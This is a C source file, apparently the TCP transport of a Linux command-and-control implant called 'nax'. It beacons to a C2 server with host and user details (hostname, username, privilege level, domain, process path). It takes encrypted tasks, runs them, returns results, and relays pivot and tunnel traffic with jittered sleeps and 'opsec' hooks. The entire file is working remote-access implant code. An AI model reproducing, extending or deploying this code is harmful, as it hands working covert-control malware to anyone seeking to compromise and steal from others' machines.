/* nax_linux/src/Transport/tcp.c */

#include "nax_linux.h"
#include "opsec.h"
#include "nax_bof_sdk.h"

#include "sysinfo.h"
#include "commands.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <poll.h>
#include <pthread.h>
#include <netdb.h>
#include <arpa/inet.h>

/* forward declarations from Core */
int nax_encrypt(const uint8_t *, const uint8_t *, uint32_t, uint8_t *, uint32_t *);
int nax_decrypt(const uint8_t *, const uint8_t *, uint32_t, uint8_t *, uint32_t *);
int nax_frame_encode(uint8_t, const uint8_t *, uint32_t, uint8_t *, uint32_t *);
int nax_frame_decode(const uint8_t *, uint32_t, uint8_t *, uint8_t **, uint32_t *);
int nax_build_reg_body(const char *, uint32_t, const char *, uint32_t,
                       uint8_t, uint32_t, uint32_t, uint32_t,
                       const char *, uint32_t, const char *, uint32_t,
                       const char *, uint32_t, uint8_t,
                       uint32_t, uint32_t, uint16_t,
                       uint32_t, uint32_t, uint32_t,
                       const char *, uint32_t,
                       uint8_t *, uint32_t *);
int nax_build_heartbeat(uint8_t *, uint32_t *);
int nax_build_result(uint32_t, uint8_t, const uint8_t *, uint32_t,
                     uint8_t *, uint32_t *);
int nax_decode_task(const uint8_t *, uint32_t, NaxTask *);
void nax_gather_sysinfo(NaxSysInfo *info);
uint8_t nax_dispatch(NaxAgent *, NaxTask *, uint8_t **, uint32_t *);

/* ===== helper: sleep with ms precision ===== */
static void sleep_ms(uint32_t ms)
{
    struct timespec ts = { ms / 1000, (ms % 1000) * 1000000L };
    nanosleep(&ts, NULL);
}

/* ===== helper: generate random session ID (16 hex bytes) ===== */
static void gen_session_id(char *out)
{
    uint8_t raw[8] = {0};

    /* Source 1: hostname bytes (up to 8) */
    char hostname[64] = {0};
    gethostname(hostname, sizeof(hostname) - 1);
    size_t hlen = strlen(hostname);
    for (size_t i = 0; i < hlen && i < 8; i++)
        raw[i] ^= (uint8_t)hostname[i];

    /* Source 2: first non-loopback interface MAC address */
    {
        struct ifreq ifr;
        struct ifconf ifc;
        char buf[1024];
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (sock >= 0) {
            ifc.ifc_len = sizeof(buf);
            ifc.ifc_buf = buf;
            if (ioctl(sock, SIOCGIFCONF, &ifc) == 0) {
                struct ifreq *it  = ifc.ifc_req;
                struct ifreq *end = it + (ifc.ifc_len / sizeof(*it));
                for (; it != end; ++it) {
                    strncpy(ifr.ifr_name, it->ifr_name, IFNAMSIZ - 1);
                    if (ioctl(sock, SIOCGIFFLAGS, &ifr) != 0) continue;
                    if (ifr.ifr_flags & IFF_LOOPBACK)           continue;
                    if (!(ifr.ifr_flags & IFF_UP))              continue;
                    if (ioctl(sock, SIOCGIFHWADDR, &ifr) != 0)  continue;
                    uint8_t *mac = (uint8_t *)ifr.ifr_hwaddr.sa_data;
                    for (int i = 0; i < 6 && i < 8; i++)
                        raw[i] ^= mac[i];
                    break;
                }
            }
            close(sock);
        }
    }

    /* If raw is all-zero (no hostname, no MAC) fall back to urandom */
    int all_zero = 1;
    for (int i = 0; i < 8; i++) if (raw[i]) { all_zero = 0; break; }
    if (all_zero) {
        FILE *f = fopen("/dev/urandom", "rb");
        if (f) { fread(raw, 1, 8, f); fclose(f); }
    }

    raw[4] ^= (uint8_t)(getpid() & 0xFF);
    raw[5] ^= (uint8_t)((getpid() >> 8) & 0xFF);

    /* Connect-out mode marker — differentiates from bind agents on same host */
#ifndef NAX_TCP_MODE_BIND
    raw[6] ^= 0xC0; /* 0xC0 = connect-out marker */
    raw[7] ^= (uint8_t)(NAX_C2_PORT & 0xFF);
#endif

    static const char hex[] = "0123456789abcdef";
    for (int i = 0; i < 8; i++) {
        out[i * 2]     = hex[(raw[i] >> 4) & 0xF];
        out[i * 2 + 1] = hex[raw[i] & 0xF];
    }
    out[16] = '\0';
}

/* ===== TCP send exactly len bytes ===== */
static int tcp_send_exact(int sock, const uint8_t *buf, uint32_t len)
{
    uint32_t sent = 0;
    while (sent < len) {
        ssize_t r = send(sock, buf + sent, len - sent, MSG_NOSIGNAL);
        if (r <= 0) {
            if (r < 0 && (errno == EINTR || errno == EAGAIN)) continue;
            return -1;
        }
        sent += (uint32_t)r;
    }
    return 0;
}

/* ===== TCP recv exactly len bytes ===== */
static int tcp_recv_exact(int sock, uint8_t *buf, uint32_t len)
{
    uint32_t got = 0;
    while (got < len) {
        ssize_t r = recv(sock, buf + got, len - got, 0);
        if (r <= 0) {
            if (r < 0 && errno == EINTR) continue;
            /* EAGAIN/EWOULDBLOCK = SO_RCVTIMEO fired — propagate to caller */
            return -1;
        }
        got += (uint32_t)r;
    }
    return 0;
}

/* ===== length-prefix send: [4 LE][data] ===== */
static int tcp_send(int sock, const uint8_t *data, uint32_t len)
{
    uint8_t hdr[4];
    hdr[0] = len & 0xFF;
    hdr[1] = (len >> 8) & 0xFF;
    hdr[2] = (len >> 16) & 0xFF;
    hdr[3] = (len >> 24) & 0xFF;
    if (tcp_send_exact(sock, hdr, 4) < 0)   return -1;
    if (len > 0 && tcp_send_exact(sock, data, len) < 0) return -1;
    return 0;
}

/* ===== length-prefix recv: [4 LE][data] — caller frees *out ===== */
static int tcp_recv(int sock, uint8_t **out, uint32_t *out_len)
{
    uint8_t hdr[4];
    if (tcp_recv_exact(sock, hdr, 4) < 0) return -1;
    uint32_t len = (uint32_t)hdr[0] | ((uint32_t)hdr[1] << 8) |
                   ((uint32_t)hdr[2] << 16) | ((uint32_t)hdr[3] << 24);
    if (len == 0 || len > NAX_IO_CAP) return -1;
    *out = malloc(len);
    if (!*out) return -1;
    if (tcp_recv_exact(sock, *out, len) < 0) {
        free(*out); *out = NULL; return -1;
    }
    *out_len = len;
    return 0;
}

/* ===== send encrypted frame ===== */
static pthread_mutex_t g_sock_mutex = PTHREAD_MUTEX_INITIALIZER;

static int send_encrypted(NaxAgent *a, uint8_t *frame, uint32_t frame_len)
{
    uint32_t enc_cap = frame_len + NAX_AES_IV + NAX_AES_BLOCK;
    uint8_t *enc = malloc(enc_cap);
    if (!enc) return -1;

    uint32_t enc_len = enc_cap;
    int rc = nax_encrypt(a->cfg.aes_key, frame, frame_len, enc, &enc_len);
    if (rc == 0) {
        pthread_mutex_lock(&g_sock_mutex);
        rc = tcp_send(a->sock, enc, enc_len);
        pthread_mutex_unlock(&g_sock_mutex);
    }
    free(enc);
    return rc;
}

/* ===== REGISTER beat: [wm(4)][session_id(16)][encrypted_register] ===== */
/* Forward declarations for tunnel.c (non-blocking, single-threaded) */
extern void     nax_process_tunnels(NaxAgent *a);
extern uint32_t nax_process_tunnels_ex(NaxAgent *a, uint8_t *out, uint32_t out_cap);

/* Process tunnels and send results — called from heartbeat loop */
static void relay_tunnels(NaxAgent *a) {
    uint8_t *buf = (uint8_t *)malloc(4 * 1024 * 1024);
    if (!buf) return;
    uint32_t tun_len = nax_process_tunnels_ex(a, buf, 4 * 1024 * 1024);
    if (tun_len > 0) {
        uint8_t frame[4 * 1024 * 1024];
        uint32_t frame_len = sizeof(frame);
        if (nax_build_result(0, NAX_STATUS_TUNNEL, buf, tun_len, frame, &frame_len) == 0)
            send_encrypted(a, frame, frame_len);
    }
    free(buf);
}

static int do_register(NaxAgent *a)
{
    NaxSysInfo info;
    nax_gather_sysinfo(&info);

    /* Build REGISTER body */
    uint8_t  reg_body[4096];
    uint32_t reg_body_len = sizeof(reg_body);

    if (nax_build_reg_body(
            info.hostname, strlen(info.hostname),
            info.username, strlen(info.username),
            NAX_ARCH_CURRENT,
            info.pid,
            a->cfg.sleep_ms,
            info.tid,
            info.ip, strlen(info.ip),
            info.domain, strlen(info.domain),
            info.procname, strlen(info.procname),
            info.elevated,
            info.os_major, info.os_minor, info.os_build,
            info.ppid,
            0,
            0,
            info.imgpath, strlen(info.imgpath),
            reg_body, &reg_body_len) < 0)
        return -1;

    /* Encode into REGISTER frame */
    uint8_t *frame = malloc(NAX_IO_CAP);
    if (!frame) return -1;
    uint32_t frame_len = NAX_IO_CAP;
    if (nax_frame_encode(NAX_WIRE_REGISTER, reg_body, reg_body_len,
                         frame, &frame_len) < 0) {
        free(frame); return -1;
    }

    /* Encrypt */
    uint32_t enc_cap = frame_len + NAX_AES_IV + NAX_AES_BLOCK;
    uint8_t *enc = malloc(enc_cap);
    if (!enc) { free(frame); return -1; }
    uint32_t enc_len = enc_cap;
    if (nax_encrypt(a->cfg.aes_key, frame, frame_len, enc, &enc_len) < 0) {
        free(frame); free(enc); return -1;
    }
    free(frame);

    /* Beat: [wm(4 LE)][session_id(16)][encrypted_frame] */
    uint32_t beat_len = 4 + NAX_SID_LEN + enc_len;
    uint8_t *beat = malloc(beat_len);
    if (!beat) { free(enc); return -1; }

    uint32_t wm = a->cfg.wm;
    beat[0] = wm & 0xFF;
    beat[1] = (wm >> 8) & 0xFF;
    beat[2] = (wm >> 16) & 0xFF;
    beat[3] = (wm >> 24) & 0xFF;
    memcpy(beat + 4, a->session_id, NAX_SID_LEN);
    memcpy(beat + 4 + NAX_SID_LEN, enc, enc_len);
    free(enc);

    int rc = tcp_send(a->sock, beat, beat_len);
    free(beat);
    return rc;
}

/* ===== send HEARTBEAT ===== */
static int do_heartbeat(NaxAgent *a)
{
    uint8_t  frame[NAX_FRAME_HDR + 64];
    uint32_t frame_len = sizeof(frame);
    if (nax_build_heartbeat(frame, &frame_len) < 0) return -1;
    return send_encrypted(a, frame, frame_len);
}

/* ===== send RESULT ===== */
static int do_send_result(NaxAgent *a, uint32_t task_id, uint8_t status,
                          const uint8_t *data, uint32_t data_len)
{
    uint8_t *frame = malloc(NAX_IO_CAP);
    if (!frame) return -1;
    uint32_t frame_len = NAX_IO_CAP;
    if (nax_build_result(task_id, status, data, data_len,
                         frame, &frame_len) < 0) {
        free(frame); return -1;
    }
    int rc = send_encrypted(a, frame, frame_len);
    free(frame);
    return rc;
}

/* ===== handle inbound data from C2 ===== */
static int handle_server_data(NaxAgent *a, uint8_t *raw, uint32_t raw_len)
{
    /* Decrypt */
    uint8_t *plain = malloc(raw_len + NAX_AES_BLOCK);
    if (!plain) return -1;
    uint32_t plain_len = raw_len + NAX_AES_BLOCK;
    if (nax_decrypt(a->cfg.aes_key, raw, raw_len, plain, &plain_len) < 0) {
        DBG("DECRYPT FAILED rawLen=%u — key mismatch?", raw_len);
        free(plain); return 0;
    }
    DBG("decrypted %u bytes → plain %u bytes", raw_len, plain_len);

    /* Walk frames */
    uint8_t  *cur = plain;
    uint32_t  rem = plain_len;
    while (rem >= NAX_FRAME_HDR) {
        uint8_t   ft = 0;
        uint8_t  *fb = NULL;
        uint32_t  fbl = 0;
        if (nax_frame_decode(cur, rem, &ft, &fb, &fbl) < 0) break;
        uint32_t step = NAX_FRAME_HDR + fbl;
        if (step > rem) break;
        cur += step;
        rem -= step;

        DBG("frame type=0x%02x bodyLen=%u", ft, fbl);
        if (ft == NAX_WIRE_NO_TASKS) { DBG("NO_TASKS frame"); break; }
        if (ft != NAX_WIRE_TASK)     continue;

        NaxTask task;
        if (nax_decode_task(fb, fbl, &task) < 0) continue;

        /* Dispatch and send result */
        uint8_t *result = NULL;
        uint32_t result_len = 0;
        DBG("dispatching cmd_id=0x%02x task_id=%u args_len=%u",
            task.cmd_id, task.task_id, task.args_len);
        uint8_t  status = nax_dispatch(a, &task, &result, &result_len);
        DBG("dispatch done: status=0x%02x result_len=%u", status, result_len);

        /* Async BOFs send their result later via nax_drain_async_results */
        if (status != NAX_STATUS_ASYNC) {
            int send_rc = do_send_result(a, task.task_id, status,
                                         result, result_len);
            (void)send_rc;
            DBG("do_send_result rc=%d task_id=%u result_len=%u", send_rc, task.task_id, result_len);
        }
        if (result) free(result);
    }

    free(plain);
    return 0;
}

/* ===== TCP connect ===== */
static int tcp_connect(NaxAgent *a)
{
    char port_str[8];
    snprintf(port_str, sizeof(port_str), "%u", (unsigned)a->cfg.c2_port);

    struct addrinfo hints = {0}, *res = NULL;
    hints.ai_family   = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    hints.ai_flags = AI_NUMERICHOST; /* IP only — avoids NSS dlopen */
    if (getaddrinfo(a->cfg.c2_host, port_str, &hints, &res) != 0)
        return -1;

    int sock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (sock < 0) { freeaddrinfo(res); return -1; }

    if (connect(sock, res->ai_addr, res->ai_addrlen) < 0) {
        close(sock);
        freeaddrinfo(res);
        return -1;
    }
    freeaddrinfo(res);
    a->sock = sock;
    return 0;
}

/* ===== effective sleep with jitter ===== */
static uint32_t effective_sleep_ms(NaxAgent *a)
{
    if (a->cfg.sleep_ms == 0) return 0;
    if (a->cfg.jitter_pct == 0) return a->cfg.sleep_ms;
    uint32_t jit = (uint32_t)(((uint64_t)a->cfg.sleep_ms * a->cfg.jitter_pct) / 100);
    uint32_t offset = jit > 0 ? (uint32_t)(random() % jit) : 0;
    /* randomly add or subtract */
    return (random() & 1) ? a->cfg.sleep_ms + offset
                           : (a->cfg.sleep_ms > offset ? a->cfg.sleep_ms - offset : 0);
}

/* ===== process_pivots ================================================
 * Iterate all child pivot connections, read any pending data, and relay
 * it to the C2 as RESULT frames with PIV_TYPE_DATA payload.
 * ===================================================================== */
static void process_pivots(NaxAgent *a)
{
    NaxPivot **pp = &a->pivot_head;
    while (*pp) {
        NaxPivot *p = *pp;
        int broken = 0;

        struct pollfd pfd = { .fd = p->sock, .events = POLLIN };

        while (1) {
            int pr = poll(&pfd, 1, 0);
            if (pr <= 0) break;
            if (!(pfd.revents & POLLIN)) break;

            /* Read length-prefixed message from child */
            uint8_t lenbuf[4];
            ssize_t got = 0;
            while (got < 4) {
                ssize_t r = recv(p->sock, lenbuf + got, 4 - got, 0);
                if (r <= 0) { broken = 1; break; }
                got += r;
            }
            if (broken) break;

            uint32_t msg_len = (uint32_t)lenbuf[0] | ((uint32_t)lenbuf[1] << 8) |
                               ((uint32_t)lenbuf[2] << 16) | ((uint32_t)lenbuf[3] << 24);
            if (msg_len == 0 || msg_len > 4 * 1024 * 1024) { broken = 1; break; }

            uint8_t *msg = (uint8_t *)malloc(msg_len);
            if (!msg) { broken = 1; break; }
            got = 0;
            while ((uint32_t)got < msg_len) {
                ssize_t r = recv(p->sock, msg + got, msg_len - (uint32_t)got, 0);
                if (r <= 0) { free(msg); broken = 1; break; }
                got += r;
            }
            if (broken) break;

            /* Pack: [PIV_TYPE_DATA(1)][pivot_id(4LE)][msg_len(4LE)][msg] */
            uint32_t rd_len = 1 + 4 + 4 + msg_len;
            uint8_t *rd = (uint8_t *)malloc(rd_len);
            if (rd) {
                rd[0] = NAX_PIV_TYPE_DATA;
                rd[1] = (uint8_t)(p->pivot_id);       rd[2] = (uint8_t)(p->pivot_id >> 8);
                rd[3] = (uint8_t)(p->pivot_id >> 16); rd[4] = (uint8_t)(p->pivot_id >> 24);
                rd[5] = (uint8_t)(msg_len);            rd[6] = (uint8_t)(msg_len >> 8);
                rd[7] = (uint8_t)(msg_len >> 16);      rd[8] = (uint8_t)(msg_len >> 24);
                memcpy(rd + 9, msg, msg_len);
                do_send_result(a, 0, NAX_STATUS_OK, rd, rd_len);
                free(rd);
            }
            free(msg);
        }

        if (broken) {
            /* Child disconnected — send UNLINK notification to C2 */
            uint8_t unlink_data[6];
            unlink_data[0] = NAX_PIV_TYPE_UNLINK;
            unlink_data[1] = (uint8_t)(p->pivot_id);       unlink_data[2] = (uint8_t)(p->pivot_id >> 8);
            unlink_data[3] = (uint8_t)(p->pivot_id >> 16); unlink_data[4] = (uint8_t)(p->pivot_id >> 24);
            unlink_data[5] = 2; /* NAX_PIVOT_TYPE_TCP */
            do_send_result(a, 0, NAX_STATUS_OK, unlink_data, sizeof(unlink_data));

            close(p->sock);
            *pp = p->next;
            free(p);
        } else {
            pp = &p->next;
        }
    }
}

/* ===== main loop ===== */
/* ===== Drain completed async BOF results ===== */

static void async_result_sender(uint32_t task_id, uint8_t status,
                                 const char *output, uint32_t output_len,
                                 void *user_data) {
    NaxAgent *a = (NaxAgent *)user_data;
    /* Build and send a RESULT frame for this completed async BOF */
    uint8_t *frame = (uint8_t *)malloc(NAX_IO_CAP);
    if (!frame) return;
    uint32_t frame_len = NAX_IO_CAP;
    if (nax_build_result(task_id, status,
                         (const uint8_t *)output, output_len,
                         frame, &frame_len) == 0) {
        /* Encrypt */
        uint32_t enc_cap = frame_len + NAX_AES_IV + NAX_AES_BLOCK;
        uint8_t *enc = (uint8_t *)malloc(enc_cap);
        if (enc) {
            uint32_t enc_len = enc_cap;
            if (nax_encrypt(a->cfg.aes_key, frame, frame_len, enc, &enc_len) == 0) {
                /* Send: [len(4LE)][encrypted] */
                uint8_t hdr[4];
                hdr[0] = enc_len & 0xFF;
                hdr[1] = (enc_len >> 8) & 0xFF;
                hdr[2] = (enc_len >> 16) & 0xFF;
                hdr[3] = (enc_len >> 24) & 0xFF;
                tcp_send_exact(a->sock, hdr, 4);
                tcp_send_exact(a->sock, enc, enc_len);
            }
            free(enc);
        }
    }
    free(frame);
}

static void nax_drain_async_results(NaxAgent *a) {
    nax_async_drain(async_result_sender, a);
}

void nax_tcp_main(NaxAgent *a)
{
    gen_session_id(a->session_id);
    nax_bof_sdk_init();
    a->running = true;

    while (a->running) {
        /* Connect */
        a->sock = -1;
        while (a->running && tcp_connect(a) < 0) {
            sleep_ms(2000); /* fixed 2s reconnect backoff */
        }
        if (!a->running) break;

        DBG("connected to %s:%d", a->cfg.c2_host, a->cfg.c2_port);

        DBG("sending REGISTER beat");
        /* Register */
        if (do_register(a) < 0) {
            DBG("REGISTER failed");
            close(a->sock); a->sock = -1;
            sleep_ms(2000);
            continue;
        }

        DBG("REGISTER sent OK — entering task loop");
        /* Task loop — TCP is interactive: send heartbeat, block until response.
         * NO sleep — recv blocks naturally until server responds.
         * Sleep only applies to HTTPS polling mode (handled in https.c). */
        while (a->running) {

           /* Process tunnels and pivots before heartbeat */
            relay_tunnels(a);
            process_pivots(a);

            /* Send heartbeat */
            nax_opsec_heartbeat();
            DBG("sending HEARTBEAT");
            if (do_heartbeat(a) < 0) { DBG("HEARTBEAT send failed"); break; }

            /* Block on recv — server always responds with TASKS or NO_TASKS.
             * Use a generous timeout (30s) as watchdog only; the server
             * responds immediately so this should never fire. */
            {
                struct timeval tv = { 30, 0 };
                setsockopt(a->sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
            }

            uint8_t *raw = NULL;
            uint32_t raw_len = 0;
            int recv_rc = tcp_recv(a->sock, &raw, &raw_len);
            if (recv_rc < 0) {
                if (errno == EAGAIN || errno == EWOULDBLOCK) {

                    DBG("recv timeout (watchdog)");
                    break;
                }
                if (errno == EINTR) continue;
                DBG("tcp_recv failed"); break;
            }
            DBG("received %u bytes from server", raw_len);
            handle_server_data(a, raw, raw_len);
            free(raw);

            nax_drain_async_results(a);

            relay_tunnels(a);
        }

        close(a->sock);
        a->sock = -1;
        sleep_ms(2000);
    }
}
